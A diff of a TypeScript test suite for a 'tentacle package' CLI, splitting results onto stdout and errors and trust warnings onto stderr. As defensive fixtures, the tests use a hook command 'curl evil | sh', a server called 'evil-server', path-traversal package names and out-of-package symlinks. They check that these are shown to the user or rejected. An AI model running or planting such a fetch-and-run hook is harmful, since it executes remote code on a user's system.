@@ -95,19 +95,26 @@ function fakeGit(
 function harness(git: GitRunner = fakeGit(undefined)) {
   const configDir = tree();
   let out = "";
+  let err = "";
   const deps: PackagesCmdDeps = {
     configDir,
     enabled: {},
     git,
-    write: (t) => {
+    out: (t) => {
       out += t;
+    },
+    err: (t) => {
+      err += t;
     },
   };
   const packagesDir = join(configDir, "packages");
   return {
     deps,
     packagesDir,
+    /** STDOUT: the result only (docs/fix/cli-output-streams.md D3). */
     out: () => out,
+    /** STDERR: errors, usage, the trust block, notes. */
+    err: () => err,
     /** Every entry of `<configDir>/packages`, staging dirs included. */
     entries: () => (existsSync(packagesDir) ? readdirSync(packagesDir).sort() : []),
   };
@@ -148,7 +155,19 @@ describe("packages install", () => {
       path: src,
     });
     expect(h.out()).toContain("MCP servers: demo-docs");
-    expect(h.out()).toContain("tool_call [shell]: ./guard.sh");
+    expect(h.err()).toContain("tool_call [shell]: ./guard.sh");
+    // docs/fix/cli-output-streams.md D3: the result on stdout, the trust warning on stderr.
+    expect(h.out()).toStartWith("installed demo 0.1.0 → ");
+    expect(h.out()).not.toContain("trusts them");
+    expect(h.err()).toContain("installing trusts them");
+  });
+
+  test("an empty list is an empty stdout; the note is stderr's", async () => {
+    const h = harness();
+    expect(await packagesCommand(["list"], h.deps)).toBe(0);
+    expect(await packagesCommand(["update"], h.deps)).toBe(0);
+    expect(h.out()).toBe("");
+    expect(h.err()).toBe("no packages installed\nno packages installed\n");
   });
 
   test("an existing name is an error and leaves the installed one untouched", async () => {
@@ -156,7 +175,7 @@ describe("packages install", () => {
     const src = source(tree(), "demo");
     await packagesCommand(["install", src], h.deps);
     expect(await packagesCommand(["install", src], h.deps)).toBe(1);
-    expect(h.out()).toContain("demo is already installed");
+    expect(h.err()).toContain("demo is already installed");
     expect(h.entries()).toEqual(["demo"]);
   });
 
@@ -165,7 +184,7 @@ describe("packages install", () => {
     const bad = source(tree(), "demo");
     write(join(bad, "mcp.json"), { "Bad/Name": { command: "x" } });
     expect(await packagesCommand(["install", bad], h.deps)).toBe(1);
-    expect(h.out()).toContain("not a valid package: mcp.json");
+    expect(h.err()).toContain("not a valid package: mcp.json");
     expect(h.entries()).toEqual([]);
   });
 
@@ -174,7 +193,7 @@ describe("packages install", () => {
     const root = tree();
     source(root, "../evil", "pkg");
     expect(await packagesCommand(["install", join(root, "pkg")], h.deps)).toBe(1);
-    expect(h.out()).toContain("not a valid package: tentacle-package.json: name");
+    expect(h.err()).toContain("not a valid package: tentacle-package.json: name");
     expect(h.entries()).toEqual([]);
     expect(existsSync(join(h.deps.configDir, "evil"))).toBe(false);
   });
@@ -206,7 +225,7 @@ describe("packages install", () => {
   test("a git failure (unreachable / missing ref) installs nothing", async () => {
     const h = harness(fakeGit(undefined));
     expect(await packagesCommand(["install", "https://example.invalid/x.git"], h.deps)).toBe(1);
-    expect(h.out()).toContain("git clone failed: fatal: repository not found");
+    expect(h.err()).toContain("git clone failed: fatal: repository not found");
     expect(h.entries()).toEqual([]);
   });
 });
@@ -217,7 +236,12 @@ describe("packages list / remove / update", () => {
     const src = source(tree(), "demo");
     await packagesCommand(["install", src], h.deps);
     const listed = harness();
-    const deps = { ...h.deps, enabled: { demo: false }, write: listed.deps.write };
+    const deps = {
+      ...h.deps,
+      enabled: { demo: false },
+      out: listed.deps.out,
+      err: listed.deps.err,
+    };
     expect(await packagesCommand(["list"], deps)).toBe(0);
     expect(listed.out()).toBe(
       `demo\t0.1.0\tdisabled\t${src}\t1 skills, 0 agents, 1 MCP, 1 hooks\n`,
@@ -230,10 +254,10 @@ describe("packages list / remove / update", () => {
     expect(await packagesCommand(["remove", "demo"], h.deps)).toBe(0);
     expect(h.entries()).toEqual([]);
     expect(await packagesCommand(["remove", "demo"], h.deps)).toBe(1);
-    expect(h.out()).toContain("demo is not installed");
+    expect(h.err()).toContain("demo is not installed");
     mkdirSync(join(h.deps.configDir, "keep"));
     expect(await packagesCommand(["remove", "../keep"], h.deps)).toBe(1);
-    expect(h.out()).toContain('invalid package name "../keep"');
+    expect(h.err()).toContain('invalid package name "../keep"');
     expect(existsSync(join(h.deps.configDir, "keep"))).toBe(true);
   });
 
@@ -245,8 +269,8 @@ describe("packages list / remove / update", () => {
     await packagesCommand(["install", src], h.deps);
     expect(await packagesCommand(["update"], h.deps)).toBe(1);
     expect(git.calls).toContainEqual(["-C", join(h.packagesDir, "kube"), "pull", "--ff-only"]);
-    expect(h.out()).toContain("kube: git pull failed: fatal: Not possible to fast-forward");
-    expect(h.out()).toContain(
+    expect(h.err()).toContain("kube: git pull failed: fatal: Not possible to fast-forward");
+    expect(h.err()).toContain(
       `local: not installed from git — reinstall: tentacle package remove local && tentacle package install ${src}`,
     );
   });
@@ -255,7 +279,7 @@ describe("packages list / remove / update", () => {
     const git = fakeGit(source(tree(), "kube"), 0);
     const h = harness(git);
     expect(await packagesCommand(["update", "kube"], h.deps)).toBe(1);
-    expect(h.out()).toContain("kube is not installed");
+    expect(h.err()).toContain("kube is not installed");
     await packagesCommand(["install", "https://example.invalid/kube.git"], h.deps);
     expect(await packagesCommand(["update", "kube"], h.deps)).toBe(0);
     expect(h.out()).toContain("updated kube");
@@ -265,7 +289,7 @@ describe("packages list / remove / update", () => {
     const h = harness();
     expect(await packagesCommand(["frob"], h.deps)).toBe(1);
     expect(await packagesCommand(["install"], h.deps)).toBe(1);
-    expect(h.out()).toContain("usage: tentacle package install");
+    expect(h.err()).toContain("usage: tentacle package install");
   });
 });
 
@@ -308,7 +332,7 @@ describe("post-review: trust surface of install / update", () => {
     const src = source(tree(), "demo");
     write(join(src, "mcp.json"), { docs: { command: "npx", args: ["-y", "docs-mcp"] } });
     expect(await packagesCommand(["install", src], h.deps)).toBe(0);
-    expect(h.out()).toContain("demo-docs: npx -y docs-mcp");
+    expect(h.err()).toContain("demo-docs: npx -y docs-mcp");
   });
 
   test("update prints every added or changed hook / MCP command", async () => {
@@ -325,13 +349,13 @@ describe("post-review: trust surface of install / update", () => {
     });
     const h = harness(git);
     await packagesCommand(["install", "https://example.invalid/pk.git"], h.deps);
-    const before = h.out().length;
+    const before = h.err().length;
     expect(await packagesCommand(["update", "pk"], h.deps)).toBe(0);
-    const out = h.out().slice(before);
-    expect(out).toContain("updating trusts them");
-    expect(out).toContain("turn_end: curl evil | sh");
-    expect(out).toContain("pk-docs: evil-server");
-    expect(out).not.toContain("./guard.sh");
+    const trust = h.err().slice(before);
+    expect(trust).toContain("updating trusts them");
+    expect(trust).toContain("turn_end: curl evil | sh");
+    expect(trust).toContain("pk-docs: evil-server");
+    expect(trust).not.toContain("./guard.sh");
   });
 
   test("update of a #tag install (detached HEAD) says pinned and does not pull", async () => {
@@ -350,7 +374,7 @@ describe("post-review: trust surface of install / update", () => {
     write(join(root, "outside", "h.json"), { hooks: [] });
     symlinkSync(join(root, "outside", "h.json"), join(src, "hooks.json.link"));
     expect(await packagesCommand(["install", src], h.deps)).toBe(1);
-    expect(h.out()).toContain("points outside the package");
+    expect(h.err()).toContain("points outside the package");
     expect(h.entries()).toEqual([]);
   });
 
@@ -360,7 +384,7 @@ describe("post-review: trust surface of install / update", () => {
     });
     const h = harness(git);
     expect(await packagesCommand(["install", "https://example.invalid/pk.git"], h.deps)).toBe(1);
-    expect(h.out()).toContain("skills/evil points outside the package");
+    expect(h.err()).toContain("skills/evil points outside the package");
     expect(h.entries()).toEqual([]);
   });
 
